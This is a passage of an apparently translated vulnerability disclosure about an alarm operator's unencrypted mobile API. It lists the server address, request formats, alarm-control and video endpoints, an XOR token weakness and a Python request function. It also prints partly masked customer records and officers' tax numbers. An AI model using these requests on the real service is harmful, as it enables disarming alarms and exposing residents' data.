<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The saga of the Gulf Stream and the level of information security in a large security company</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="This publication is for informational purposes only and is intended to draw the attention of the management of a major Russian operator of alarm syste...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The saga of the Gulf Stream and the level of information security in a large security company</h1><div class="post__text post__text-html js-mediator-article"><p>  This publication is for informational purposes only and is intended to draw the attention of the management of a major Russian operator of alarm systems, <a href="https://www.gulfstream.ru/">GULF STREAM Security Systems</a> (hereinafter - GULF STREAM), to the existence of an information system that compromises the protection and safety of citizens, as well as federal executive authorities who have entrusted protection your company‚Äôs property. </p><a name="habracut"></a><br><p>  <strong>ATTENTION</strong> : We recommend reading the text to the music of the group <a href="https://www.youtube.com/watch%3Fv%3DrVYtS_cp-yc">Kasta-Skrepy</a> , it helps a lot to understand more deeply the hopelessness of the situation described below ... </p><br><h1 id="predislovie">  Foreword </h1><br><p>  In the difficult times of the digital economy and the power attempts to regulate the Internet, I would like to make my modest contribution to improving this World and highlight the attitude to information security on the part of one private company.  In our publication, we will show how GULF STREAM has demonstrated its devil-may-care attitude to this issue, thereby substituting not only ordinary users, citizens, but also executive authorities. </p><br><p>  Some time ago, information about the presence of a serious vulnerability in the GULF STREAM information system turned out to be at the disposal of Expocod.  According to our reliable data, the vulnerability allows access to personal data of users of the alarm system, as well as remote control of the alarm status of a huge number of objects. </p><br><p>  Since this information was received, we have made repeated attempts to contact the GOLFSTRIM management, but so far none of these attempts have been unsuccessful (4 emails, 3 phone calls, messages to the Telegram, a visit to the office and in-person communication with representatives companies).  Considering that Expocod aims to increase the general level of information security in Russia, as well as the fact that representatives of GOLSTREAM disregard our numerous signals, it was decided to publish the information we have at our disposal in the media with the disclosure of general technical details. </p><br><h1 id="obschaya-informaciya-o-kompanii-golfstrim-ohrannye-sistemy">  General information about the company "GULF STREAM Security Systems" </h1><br><p>  Based on the information provided on the official website of the company, the GULF STREAM group of companies has been operating in the security market for almost 23 years.  Advertising from the official site states that the 23 years of work GULF STREAM is (we quote): ‚Äútime-tested solutions, 75 thousand clients, quality at each stage, personnel qualifications ...‚Äù. </p><br><p>  A quick search through the database of state registration of legal entities gives the following: </p><br><ul><li>  SOCIETY WITH LIMITED LIABILITY PRIVATE SECURITY ORGANIZATION "GOLF STREAM PROTECTION SERVICE" <br>  OGRN / INN 1107746777380/7715829624 <br>  Registration date 09/23/2010 <br>  Authorized capital 250000r <br>  General Director IVANOV ALEXEY VLADIMIROVICH (INN 504008784580) <br>  Founders WRITER VENIAMIN FONEVICH (share 100%) </li><li>  LIMITED LIABILITY COMPANY PRIVATE SECURITY ORGANIZATION "GOLF STREAM SECURITY SYSTEMS" <br>  OGRN / INN 1097746799875/7715787653 <br>  Date of registration 12/14/2009 <br>  Authorized capital 250000r <br>  General Director SAMODUMSKY STANISLAV ALEKSANDROVICH <br>  Founders PISMEN VENIAMIN FONEVICH (share 99%), SAMODUMSKY STANISLAV ALEKSANDROVICH (share 1%) </li></ul><br><p>  So, open sources suggest that the owner (and the chairman of the board of directors) of the GULF STREAM company is someone Pisman Veniamin Fonevich (TIN 771805121540): </p><br><p><img src="https://habrastorage.org/web/d93/fba/9c9/d93fba9c99254d6c8a6b6990483d29a2.png"></p><br><p>  Taking this opportunity, we convey fervent greetings to Veniamin Fonevich and ask to pay attention to the actions or inactions of the employees of his company who, being informed long before the publication of this material, made absolutely no attempt to respond. </p><br><p><img src="https://habrastorage.org/web/99b/ee9/47b/99bee947ba334a5eb031b840928db9bd.png"></p><br><p>  Turning directly to the technical part of our narration, it is worthwhile to emphasize once again that the company "Expocod" has reliable information about the presence of a vulnerability.  However, due to the fact that this vulnerability was discovered by an independent security researcher, we have only partial details and no data that could have been obtained using this vulnerability.  By agreement with the author and with his permission, we publish technical details without specifying important details, knowledge of which is necessary for successful operation. </p><br><h1 id="opisanie-uyazvimosti">  Vulnerability description </h1><br><p>  Vulnerability exists in the protocol of interaction of the mobile application (MP) with the control center (MC).  At the time of publication, the protocol of exchange between the application for iOS (the latest version of the application dated 06/29/2017) is investigated.  The protocol is a REST-like interface built on top of HTTP.  Requests to the CO have the following format: </p><br><pre><code class="hljs ruby">POST <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/195.19.222.170/</span></span>GulfstreamWebServices/rest/[method] HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> <span class="hljs-symbol"><span class="hljs-symbol">Accept:</span></span> *<span class="hljs-regexp"><span class="hljs-regexp">/*, Accept-Encoding: gzip, deflate Accept-Language: en-us Connection: keep-alive Content-Type: application/json</span></span> Proxy-<span class="hljs-symbol"><span class="hljs-symbol">Connection:</span></span> keep-alive User-<span class="hljs-symbol"><span class="hljs-symbol">Agent:</span></span> SecurityApp/<span class="hljs-number"><span class="hljs-number">190</span></span> CFNetwork/<span class="hljs-number"><span class="hljs-number">811.5</span></span>.<span class="hljs-number"><span class="hljs-number">4</span></span> Darwin/<span class="hljs-number"><span class="hljs-number">16.7</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> { <span class="hljs-symbol"><span class="hljs-symbol">userID:</span></span> [userID], <span class="hljs-symbol"><span class="hljs-symbol">userToken:</span></span> [userToken] }</code> </pre> <br><p>  The first thing that catches your eye is the absence of any data encryption.  That is, the exchange of critical information between the MP and CC is carried out through an open communication channel without any protection against passive listening!  <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">Certificate pinning</a> technology is also not used, which could help protect against MiTM attacks on the control channel.  In our case, the protocol is easily analyzed using the mitmproxy application, which even a schoolchild can use (and after all, the alarm management application is designed for serious things). </p><br><p>  The next step should probably begin with a description of parameters such as <code>userID</code> and <code>userToken</code> .  Obviously, the <code>userID</code> is the user ID of the mobile application, while the <code>userToken</code> is a token that allows a given user to access the system functions.  Let us consider the function of user registration in the system: </p><br><pre> <code class="hljs ruby">POST <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/195.19.222.170/</span></span>GulfstreamWebServices/rest/profile/register HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> <span class="hljs-symbol"><span class="hljs-symbol">Accept:</span></span> *<span class="hljs-regexp"><span class="hljs-regexp">/*, Accept-Encoding: gzip, deflate Accept-Language: en-us Connection: keep-alive Content-Type: application/json</span></span> Proxy-<span class="hljs-symbol"><span class="hljs-symbol">Connection:</span></span> keep-alive User-<span class="hljs-symbol"><span class="hljs-symbol">Agent:</span></span> SecurityApp/<span class="hljs-number"><span class="hljs-number">190</span></span> CFNetwork/<span class="hljs-number"><span class="hljs-number">811.5</span></span>.<span class="hljs-number"><span class="hljs-number">4</span></span> Darwin/<span class="hljs-number"><span class="hljs-number">16.7</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> { <span class="hljs-symbol"><span class="hljs-symbol">contractNumber:</span></span> [contractNumber], <span class="hljs-symbol"><span class="hljs-symbol">deviceToken:</span></span> [deviceToken], <span class="hljs-symbol"><span class="hljs-symbol">deviceType:</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> }</code> </pre> <br><p>  This function registers the MP in the system.  Registration parameters are the contract number and the unique device identifier.  Below are the system responses to attempts to register a new device for the same contract with different <code>deviceToken</code> values: </p><br><pre> <code class="hljs ruby">deviceToken = E3cDC2DdCdf75afc5865DBE2Ead3a4BB2fdB2CabBD441ADDaaa81ea8Dfd9C9ae Reply <span class="hljs-meta"><span class="hljs-meta">&gt;&gt; </span></span>{<span class="hljs-string"><span class="hljs-string">"IsError"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:false</span></span>,<span class="hljs-string"><span class="hljs-string">"ErrorObj"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:null</span></span>,<span class="hljs-string"><span class="hljs-string">"Result"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span>{<span class="hljs-string"><span class="hljs-string">"userID"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">71671</span></span>,<span class="hljs-string"><span class="hljs-string">"userToken"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"dkJCRVg="</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"contractNumber"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"495020xxxx"</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"phone"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"7******7007"</span></span></span></span>}} deviceToken = <span class="hljs-number"><span class="hljs-number">7</span></span>e3280581591Af0e5eaabadbE5b33B0Af84e20CBBd16226a22f5C3570A02B341 Reply &gt;&gt; {<span class="hljs-string"><span class="hljs-string">"IsError"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:false</span></span>,<span class="hljs-string"><span class="hljs-string">"ErrorObj"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:null</span></span>,<span class="hljs-string"><span class="hljs-string">"Result"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span>{<span class="hljs-string"><span class="hljs-string">"userID"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">72033</span></span>,<span class="hljs-string"><span class="hljs-string">"userToken"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"dkFEQVo="</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"contractNumber"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"495020xxxx"</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"phone"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"7******7007"</span></span></span></span>}} deviceToken = aEd42FB8CBf8Af3E9Ec6Af8cad0C4deF2eaeF200EaBFf4DDFeeDFF4106CC703A Reply &gt;&gt; {<span class="hljs-string"><span class="hljs-string">"IsError"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:false</span></span>,<span class="hljs-string"><span class="hljs-string">"ErrorObj"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:null</span></span>,<span class="hljs-string"><span class="hljs-string">"Result"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span>{<span class="hljs-string"><span class="hljs-string">"userID"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">72072</span></span>,<span class="hljs-string"><span class="hljs-string">"userToken"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"dkFERVs="</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"contractNumber"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"495020xxxx"</span></span></span></span>,<span class="hljs-string"><span class="hljs-string">"phone"</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">"7******7007"</span></span></span></span>}}</code> </pre> <br><p>  As you can see, the response to the request is a JSON structure, including the <code>userID</code> and <code>userToken</code> .  In addition, there is a partly hidden telephone number of the contract holder in the reply.  You can also see that at the moment there are about 72 thousand users in the system (or attempts to register MPs, because each attempt with a new <code>deviceToken</code> gives a new "unique" <code>userID</code> ). </p><br><p>  However, the most surprising discovery is the following: <code>userID</code> numbers are issued sequentially, and there is a pattern in the <code>userToken</code> token structure ... It can be assumed that <code>userToken</code> somehow depends on <code>userID</code> , that is, <code>userToken = f(userID)</code> .  But what is this feature? </p><br><p>  We do not have information on how exactly the security researcher, who contacted us and transmitted this information, managed to establish the exact function, but according to him, this function turned out to be ... an ordinary <strong>XOR</strong> ! </p><br><p>  Thus, knowing the range of <code>userID</code> values ‚Äã‚Äã(0..72k) and the function by which the <code>userToken</code> is calculated, you can access, for example, the following system REST API: </p><br><pre> <code class="hljs mel">GulfstreamWebServices/rest/profile/updateUserDeviceToken GulfstreamWebServices/rest/profile/getCustomerDetails GulfstreamWebServices/rest/profile/getCustomerProfileImage GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getEstimateArmState GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/setArmState GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getEventHistory GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getNotifications GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getAvailableNotificationExtendedList GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getNotificationState GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getRemoteTags GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/updateRemoteTagState GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getVideo GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getAllVideos GulfstreamWebServices/rest/<span class="hljs-keyword"><span class="hljs-keyword">panel</span></span>/getPanelCameraList</code> </pre> <br><p>  The list provided is by no means complete.  In conjunction with the possibility of busting user identification, you can get a complete database of objects of protection.  For example, below is the python function that requests information about a user: </p><br><pre> <code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">gs_api_get_customer_details</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(u, t)</span></span></span></span>:  r = s.post(     <span class="hljs-string"><span class="hljs-string">'http://195.19.222.170/GulfstreamWebServices/rest/profile/getCustomerDetails'</span></span>,    headers = {      <span class="hljs-string"><span class="hljs-string">'Accept'</span></span>: <span class="hljs-string"><span class="hljs-string">'*/*'</span></span>,       <span class="hljs-string"><span class="hljs-string">'Accept-Encoding'</span></span>: <span class="hljs-string"><span class="hljs-string">'gzip, '</span></span>       <span class="hljs-string"><span class="hljs-string">'deflate'</span></span>,       <span class="hljs-string"><span class="hljs-string">'Accept-Language'</span></span>: <span class="hljs-string"><span class="hljs-string">'en-us'</span></span>,       <span class="hljs-string"><span class="hljs-string">'Connection'</span></span>: <span class="hljs-string"><span class="hljs-string">'keep-alive'</span></span>,       <span class="hljs-string"><span class="hljs-string">'Content-Type'</span></span>: <span class="hljs-string"><span class="hljs-string">'application/json'</span></span>,       <span class="hljs-string"><span class="hljs-string">'Proxy-Connection'</span></span>: <span class="hljs-string"><span class="hljs-string">'keep-alive'</span></span>,       <span class="hljs-string"><span class="hljs-string">'User-Agent'</span></span>: <span class="hljs-string"><span class="hljs-string">'SecurityApp/190 '</span></span>       <span class="hljs-string"><span class="hljs-string">'CFNetwork/811.5.4 '</span></span>       <span class="hljs-string"><span class="hljs-string">'Darwin/16.7.0'</span></span> },     json = {       <span class="hljs-string"><span class="hljs-string">'userID'</span></span>: u,       <span class="hljs-string"><span class="hljs-string">'userToken'</span></span>: t     } ) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r.json()</code> </pre> <br><p>  Check out what you can get using the <code>profile/getCustomerDetails</code> for a user with <code>userID = 296</code> : </p><br><pre> <code class="hljs pgsql">{<span class="hljs-string"><span class="hljs-string">'IsError'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'ErrorObj'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, <span class="hljs-string"><span class="hljs-string">'Result'</span></span>: {<span class="hljs-string"><span class="hljs-string">'contractNumber'</span></span>: <span class="hljs-string"><span class="hljs-string">'71/*****'</span></span>, <span class="hljs-string"><span class="hljs-string">'fullName'</span></span>: <span class="hljs-string"><span class="hljs-string">'  '</span></span>, <span class="hljs-string"><span class="hljs-string">'address'</span></span>: <span class="hljs-string"><span class="hljs-string">'. , - , . ******,  ******-21, . *****'</span></span>, <span class="hljs-string"><span class="hljs-string">'accountStatus'</span></span>: <span class="hljs-number"><span class="hljs-number">1001</span></span>, <span class="hljs-string"><span class="hljs-string">'paidTill'</span></span>: <span class="hljs-string"><span class="hljs-string">'2017-12-31 00:00'</span></span>, <span class="hljs-string"><span class="hljs-string">'debt'</span></span>: <span class="hljs-string"><span class="hljs-string">'-9560.00'</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareType'</span></span>: <span class="hljs-number"><span class="hljs-number">2002</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareHasAddendum'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareHasNightMode'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'panelID'</span></span>: <span class="hljs-string"><span class="hljs-string">'*****58'</span></span>, <span class="hljs-string"><span class="hljs-string">'activationCode'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'intercomCode'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'email'</span></span>: <span class="hljs-string"><span class="hljs-string">'v*****n@gulfstream.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'telephone'</span></span>: <span class="hljs-string"><span class="hljs-string">'7910*****38'</span></span>, <span class="hljs-string"><span class="hljs-string">'homeTelephone'</span></span>: <span class="hljs-string"><span class="hljs-string">'+7 (495) *****-82'</span></span>, <span class="hljs-string"><span class="hljs-string">'workTelephone'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'monthlyFee'</span></span>: <span class="hljs-string"><span class="hljs-string">'2390.0'</span></span>, <span class="hljs-string"><span class="hljs-string">'paymentSiteURL'</span></span>: <span class="hljs-string"><span class="hljs-string">'http://www.gulfstream.ru/abonents/payment/?from=app&amp;contractID=71/*****&amp;debt=0'</span></span>, <span class="hljs-string"><span class="hljs-string">'userID'</span></span>: <span class="hljs-number"><span class="hljs-number">296</span></span>, <span class="hljs-string"><span class="hljs-string">'userToken'</span></span>: <span class="hljs-string"><span class="hljs-string">'*****'</span></span>, <span class="hljs-string"><span class="hljs-string">'deviceToken'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, <span class="hljs-string"><span class="hljs-string">'deviceType'</span></span>: <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'accountName'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, <span class="hljs-string"><span class="hljs-string">'averagePanelTime'</span></span>: <span class="hljs-number"><span class="hljs-number">25</span></span>, <span class="hljs-string"><span class="hljs-string">'averagePanelTimeEnd'</span></span>: <span class="hljs-number"><span class="hljs-number">120</span></span>, <span class="hljs-string"><span class="hljs-string">'shouldShowPaymentInfo'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'isPhotoSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'isRemoteTagsSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'longitude'</span></span>: *****, <span class="hljs-string"><span class="hljs-string">'latitude'</span></span>: *****, <span class="hljs-string"><span class="hljs-string">'timeZone'</span></span>: <span class="hljs-string"><span class="hljs-string">'Europe/Moscow'</span></span>, <span class="hljs-string"><span class="hljs-string">'balance'</span></span>: <span class="hljs-number"><span class="hljs-number">9560.0</span></span>, <span class="hljs-string"><span class="hljs-string">'smartPlugTimeout'</span></span>: <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-string"><span class="hljs-string">'isSmartPlugsSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'isTemperatureReadingSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'temperatureSensorTimeout'</span></span>: <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-string"><span class="hljs-string">'timeZoneName'</span></span>: <span class="hljs-string"><span class="hljs-string">' (GMT+3)'</span></span>, <span class="hljs-string"><span class="hljs-string">'timeZoneOffset'</span></span>: <span class="hljs-number"><span class="hljs-number">180</span></span>}}</code> </pre> <br><p>  As you can see, the address of the object (hidden intentionally) belongs to the NP " <a href="http://zhukovka-21.com/">Zhukovka-21</a> ", the co-founder of which, according to information from open sources, is the respected Veniamin Fonevich himself: </p><br><p><img src="https://habrastorage.org/web/c14/774/94c/c1477494caa54dbfa5bd8bd946fb769c.png"></p><br><p>  So, someone with <code>userID = 296</code> looks like the founder of the GULF STREAM company.  Information obtained earlier from public sources confirms the authenticity of this data. </p><br><p>  Another interesting API method is <code>panel/getVideo</code> .  With it, you can get video from cameras installed at the facility if the alarm is equipped with the appropriate equipment.  For example, see the user's video with <code>userID = 70072</code> : </p><br><pre> <code class="hljs pgsql">{<span class="hljs-string"><span class="hljs-string">'IsError'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'ErrorObj'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, <span class="hljs-string"><span class="hljs-string">'Result'</span></span>: {<span class="hljs-string"><span class="hljs-string">'contractNumber'</span></span>: <span class="hljs-string"><span class="hljs-string">'******'</span></span>, <span class="hljs-string"><span class="hljs-string">'fullName'</span></span>: <span class="hljs-string"><span class="hljs-string">'   '</span></span>, <span class="hljs-string"><span class="hljs-string">'address'</span></span>: <span class="hljs-string"><span class="hljs-string">'. , . , . 62'</span></span>, <span class="hljs-string"><span class="hljs-string">'accountStatus'</span></span>: <span class="hljs-number"><span class="hljs-number">1001</span></span>, <span class="hljs-string"><span class="hljs-string">'paidTill'</span></span>: <span class="hljs-string"><span class="hljs-string">'2016-04-26 00:00'</span></span>, <span class="hljs-string"><span class="hljs-string">'debt'</span></span>: <span class="hljs-string"><span class="hljs-string">'0.00'</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareType'</span></span>: <span class="hljs-number"><span class="hljs-number">2004</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareHasAddendum'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'hardwareHasNightMode'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'panelID'</span></span>: <span class="hljs-string"><span class="hljs-string">'00146737'</span></span>, <span class="hljs-string"><span class="hljs-string">'activationCode'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'intercomCode'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'email'</span></span>: <span class="hljs-string"><span class="hljs-string">'csm_tech@gulfstream.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'telephone'</span></span>: <span class="hljs-string"><span class="hljs-string">'7926322****'</span></span>, <span class="hljs-string"><span class="hljs-string">'homeTelephone'</span></span>: <span class="hljs-string"><span class="hljs-string">'7495980****'</span></span>, <span class="hljs-string"><span class="hljs-string">'workTelephone'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'monthlyFee'</span></span>: <span class="hljs-string"><span class="hljs-string">'690.0'</span></span>, <span class="hljs-string"><span class="hljs-string">'paymentSiteURL'</span></span>: <span class="hljs-string"><span class="hljs-string">'http://www.gulfstream.ru/abonents/payment/?from=app&amp;contractID=*****&amp;debt=0'</span></span>, <span class="hljs-string"><span class="hljs-string">'userID'</span></span>: <span class="hljs-number"><span class="hljs-number">70072</span></span>, <span class="hljs-string"><span class="hljs-string">'userToken'</span></span>: <span class="hljs-string"><span class="hljs-string">'*****'</span></span>, <span class="hljs-string"><span class="hljs-string">'deviceToken'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, <span class="hljs-string"><span class="hljs-string">'deviceType'</span></span>: <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'accountName'</span></span>: <span class="hljs-string"><span class="hljs-string">' '</span></span>, <span class="hljs-string"><span class="hljs-string">'averagePanelTime'</span></span>: <span class="hljs-number"><span class="hljs-number">25</span></span>, <span class="hljs-string"><span class="hljs-string">'averagePanelTimeEnd'</span></span>: <span class="hljs-number"><span class="hljs-number">120</span></span>, <span class="hljs-string"><span class="hljs-string">'shouldShowPaymentInfo'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'isPhotoSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'isRemoteTagsSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'longitude'</span></span>: <span class="hljs-number"><span class="hljs-number">37.583751</span></span>, <span class="hljs-string"><span class="hljs-string">'latitude'</span></span>: <span class="hljs-number"><span class="hljs-number">55.803008</span></span>, <span class="hljs-string"><span class="hljs-string">'timeZone'</span></span>: <span class="hljs-string"><span class="hljs-string">'Europe/Moscow'</span></span>, <span class="hljs-string"><span class="hljs-string">'balance'</span></span>: <span class="hljs-number"><span class="hljs-number">0.0</span></span>, <span class="hljs-string"><span class="hljs-string">'smartPlugTimeout'</span></span>: <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-string"><span class="hljs-string">'isSmartPlugsSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'isTemperatureReadingSupported'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">'temperatureSensorTimeout'</span></span>: <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-string"><span class="hljs-string">'timeZoneName'</span></span>: <span class="hljs-string"><span class="hljs-string">' (GMT+3)'</span></span>, <span class="hljs-string"><span class="hljs-string">'timeZoneOffset'</span></span>: <span class="hljs-number"><span class="hljs-number">180</span></span>}}</code> </pre> <br><p><img src="https://habrastorage.org/web/0bb/97f/4f6/0bb97f4f6e4b41b2a7973f821f053922.JPG"><img src="https://habrastorage.org/web/d50/9e4/e34/d509e4e343cd424cbfe9064814a8cc1b.JPG"></p><br><p><img src="https://habrastorage.org/web/2e0/030/3c3/2e00303c38134b3fa5b68f6a7e69476e.JPG"><img src="https://habrastorage.org/web/602/e21/316/602e21316af4464b86bb0980de6a64f7.JPG"></p><br><p>  Probably, this object is an office of the company "GULF STREAM". </p><br><p>  Another interesting feature is the function of requesting information about contactless keys: <code>panel/getRemoteTags</code> .  With objects equipped with contactless keys, you can get information not only about the serial numbers of the keys (which will make it possible to duplicate the key), but also disable certain keys and also replace their serial numbers.  The following picture demonstrates the use of mitmproxy and displays serials of keys for a test bench located in the company's office (the same <code>userID = 70072</code> , Pasha and Kolya - hello): </p><br><p><img src="https://habrastorage.org/web/d38/d13/c4c/d38d13c4cec0415b9d9d3525ec080022.JPG"></p><br><p>  Well, in conclusion, we note that in addition to requesting information from objects, this protocol allows you to control the state of the alarm.  Using <code>panel/setArmState</code> you can enable and disable the 